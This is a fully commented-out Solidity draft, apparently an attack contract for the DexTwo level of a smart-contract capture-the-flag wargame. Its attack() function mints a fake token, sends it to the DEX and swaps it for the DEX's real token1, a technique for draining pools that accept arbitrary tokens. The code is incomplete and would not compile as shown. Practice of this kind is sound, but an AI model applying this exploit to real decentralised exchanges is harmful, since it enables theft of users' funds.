// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.20;



// interface IDexTwo { // 1) change interface name

//     function swap(address from, address to, uint256 amount) external;
//     function token1() view external returns (address);
//     function token2() view external returns (address);
// }

// // contract AttackToken  {
// //     constructor() ERC20("AttackToken", "ATK") {
// //         _mint(msg.sender, 1000);
// //     }
// // }

// contract DexTwoAttack { // 2) change nameattck

//     IDexTwo target;

//     constructor(address _target) {
//         target = IDexTwo(_target);
//     }

//     function attack() external {
        
//         AttackToken attoken = new AttackToken();
//         attoken.transfer(address(target), 1);
//         target.swap(address(attoken), target.token1(), 1);

//     }
// }